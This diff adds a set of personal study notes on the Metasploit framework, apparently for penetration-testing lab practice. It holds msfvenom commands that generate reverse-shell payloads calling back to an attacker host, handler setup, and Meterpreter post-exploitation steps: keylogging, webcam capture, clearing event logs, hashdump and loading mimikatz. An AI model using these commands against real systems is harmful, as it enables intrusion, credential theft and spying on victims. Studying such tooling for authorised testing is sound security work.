@@ -1,0 +1,189 @@
+Metasploit Pro: GUI
+Metasploit Framework: open-source CmdLine  // useful for vulnerability research 
+    main components:
+      msfconsole: The main command-line interface.
+      Modules: exploit modules, scanner modules, payload modules, etc.
+      Tools: Stand-alone tools to help vulnerability research, vulnerability assessment, or pen testing 
+             Some of these tools are msfvenom, pattern_create and pattern_offset. 
+Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, 
+or performing a brute-force attack
+
+Metasploit payloads can be initially divided into two categories; inline (also called single) and staged
+
+!!!Recurring concepts: vulnerability, exploit, and payload
+                                Vuln: A design, coding, or logic flaw affecting the target system.
+                                Exploit: A piece of code that USES the vuln code present on the target system to exploit it
+                                Payload: An EXPLOIT will take advantage of a vulnerability.get shell, install backdoor, or POC by remotely launching calc.exe
+//MODULES
+Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, etc..
+    IN->  /opt/metasploit-framework-5101/modules# tree -L 1 auxiliary/
+Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
+    IN->  /opt/metasploit-framework-5101/modules# tree -L 1 encoders/
+Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.
+    IN->  /opt/metasploit-framework-5101/modules# tree -L 2 evasion/
+Exploits: Exploits, neatly organized by target system.
+    IN->  /opt/metasploit-framework-5101/modules# tree -L 1 exploits/
+NOPs: NOPs (No OPeration) do nothing, literally.
+    Intel x86 are represented as 0x90, CPU will do nothing for ONE cycle-> often used as a buffer to achieve consistent payload size
+    IN->  /opt/metasploit-framework-5101/modules# tree -L 1 nops/    
+Payloads: Payloads are codes that will run on the target system.
+    IN->  /opt/metasploit-framework-5101/modules# tree -L 1 payloads/
+        3 different Dirs: SINGLES, STAGER & STAGES
+            Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
+            Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
+            Stages: Downloaded by the stager. This will allow you to use larger sized payloads.
+                Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.
+                        "generic/shell_reverse_tcp"
+                        "windows/x64/shell/reverse_tcp"
+                Both reverse Windows shells. 1st is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. 2nd is a staged payload, as indicated by the “/” between “shell” and “reverse”.
+Post: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.
+    IN->  /opt/metasploit-framework-5101/modules# tree -L 1 post/
+    
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+MSFCONSOLE
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+msf6>   history                     <-- shows cmd history
+msf6>   set / unset / unset all     <-- set/ unset options (setg/unsetg for setting global)
+msf6>   use                         <-- to use module       
+msf6>   show "options|payloads"     <-- show module (auxiliary, payload, exploit, etc.) 
+msf6>   back                        <-- leave payload/exploit context
+msf6>   info                        <-- show more info on module (info exploit/windows/smb/ms17_010_eternalblue)
+msf6>   search "ms17-010"           <-- can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system "search type:auxiliary telnet"    
+msf6>   background                  <-- background "meterpreter" session
+msf6>   sessions                    <-- view sessions
+msf6>   sessions -i "#"             <-- interact with session #
+msf6>   "exploit|run" -z                  <-- will run exploit (-z auto background session)
+msf6>   check                       <-- check if target is vuln (some modules supprt this)
+C:\Windows\system32> Ctrl+Z | Ctrl+C  <-- C= abort | Z background 
+meterpreter>    search STRING       <-- meterpreter has a search 
+
+-----SCANNING---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+msf6>   search portscan             <-- find portscanners in msf
+msf6>   nmap -sC [TARGET]           <-- nmap from msf
+msf6>   nmap -v --script vuln TARGET  
+msf6>   aux..(...) > run            <-- will execute scanner
+msf6>   scanner/smb/smb_version  |  auxiliary/scanner/netbios/nbname  |  auxiliary/scanner/http/http_version  |  smb_login "to brute force login"  
+
+-----MSF Database---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+$   systemctl start postgresql      <-- start the PostgreSQL db "db feature will allow you to create workspaces"
+$   msfdb init                      <-- initialize db
+msf6>   db_status
+msf6>   workspace                   <-- view workspace (-a add workspace -d delete workspace -h for help)
+msf6>   workspace "-d|-a" wrkspanceName
+msf6>   db_nmap -sC -sV TARGET      <-- all results will be saved to db
+msf6>   "hosts|services"            <-- info relevant to hosts and services running on target systems
+
+-----MSF VENOM----- Replaced Msfpayload & Msfencode---------------------------------------------------------------------------------------------------------------------------------
+$ msfvenom -l payloads
+$ msfvenom -l formats               <--You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER -f raw -e php/base64     <-- -e parameter (encoding) The PHP version of Meterpreter was encoded in Base64, and the output format was raw   
+
+MsfVenom requires a "Handler" to catch the Shell (use Metasploit  | Cobalt Strike Listener)
+msf6>   use exploit/multi/handler                       <-- SET options 
+msf6>   set payload php/reverse_php                     <-- if using PHP reverse shell
+msf6>   set payload linux/x86/meterpreter/reverse_tcp   <-- if using Linux reverse shell
+msf6>   run
+
+meterpreter>    run post/linux/gather/hashdump
+
+NOTE: when gen php shell --> need to edit file to make it a working php file -> remove comments tags in <?php & add ?> at the EOF
+
+Other Payloads example:
+
+Linux Executable Link Format (elf)      On target use the chmod +x shell.elf to make executable, run this file by typing ./shell.elf on the target machine cmd line.
+        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+Windows
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+PHP
+        msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+ASP
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+Python
+        msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+
+----- Meterpreter  (Lives in Memory) --------------------------------------------------------------------------------------------------------------------------------------------    
+
+Meterpreter will establish an encrypted (TLS) communication channel with the attacker's system
+
+meterpreter >   getpid                                                           <-- get current process meterepeters running in
+meterpreter >   ps                                                               <-- Lists Processes on Victim machine
+C:\Windows\system32> tasklist /m /fi "pid eq 1304"                               <-- View DLLs for PID 1304
+# msfvenom --list payloads | grep meterpreter
+msf6> exploit(windows/smb/ms17_010_eternalblue) > show payloads                  <-- show payloads for exploit
+
+Meterpreter Commands: meterpreter> "help"
+    Core commands
+            background: Backgrounds the current session
+            exit: Terminate the Meterpreter session
+            guid: Get the session GUID (Globally Unique Identifier)
+            help: Displays the help menu
+            info: Displays information about a Post module
+            irb: Opens an interactive Ruby shell on the current session
+            load: Loads one or more Meterpreter extensions
+            migrate: Allows you to migrate Meterpreter to another process
+            run: Executes a Meterpreter script or Post module
+            sessions: Quickly switch to another session
+    File system commands
+            cd: Will change directory
+            ls: Will list files in the current directory (dir will also work)
+            pwd: Prints the current working directory
+            edit: will allow you to edit a file
+            cat: Will show the contents of a file to the screen
+            rm: Will delete the specified file
+            search: Will search for files
+            upload: Will upload a file or directory
+            download: Will download a file or directory
+    Networking commands
+            arp: Displays the host ARP (Address Resolution Protocol) cache
+            ifconfig: Displays network interfaces available on the target system
+            netstat: Displays the network connections
+            portfwd: Forwards a local port to a remote service
+            route: Allows you to view and modify the routing table
+    System commands
+            clearev: Clears the event logs
+            execute: Executes a command
+            getpid: Shows the current process identifier
+            getuid: Shows the user that Meterpreter is running as
+            kill: Terminates a process
+            pkill: Terminates processes by name
+            ps: Lists running processes
+            reboot: Reboots the remote computer
+            shell: Drops into a system command shell
+            shutdown: Shuts down the remote computer
+            sysinfo: Gets information about the remote system, such as OS
+    Others Commands (these will be listed under different menu categories in the help menu)
+            idletime: Returns the number of seconds the remote user has been idle
+            keyscan_dump: Dumps the keystroke buffer
+            keyscan_start: Starts capturing keystrokes
+            keyscan_stop: Stops capturing keystrokes
+            screenshare: Allows you to watch the remote user's desktop in real time
+            screenshot: Grabs a screenshot of the interactive desktop
+            record_mic: Records audio from the default microphone for X seconds
+            webcam_chat: Starts a video chat
+            webcam_list: Lists webcams
+            webcam_snap: Takes a snapshot from the specified webcam
+            webcam_stream: Plays a video stream from the specified webcam
+            getsystem: Attempts to elevate your privilege to that of local system
+            hashdump: Dumps the contents of the SAM database
+
+POST Exploitation 
+-----------------
+meterpreter>    getuid                                              <-- display the user with which Meterpreter is currently running
+meterpreter>    migrate 716                                         <-- migrate to a more stable process (view process's w/ ps cmd)
+meterpreter>    "keyscan_start |  keyscan_stop, | keyscan_dump"     <-- make Meterpreter act like a keylogger
+meterpreter>    hashdump                                            <-- dump SAM database
+meterpreter>    search -f flag2.txt                                 <-- search is avail. in meterpreter sessions
+meterpreter>    shell                                               <-- launch a regr cmd-line shell on the target. CTRL+Z will go back to the Meterpreter shell
+meterpreter>    load help                                           <-- shows all modules you can load on target
+meterpreter>    load kiwi                                           <-- load kiwi "mimikatz" on target
+meterpreter>    load python                                         <-- load python on target
+
+
+
+
+
+
+
+
+
+
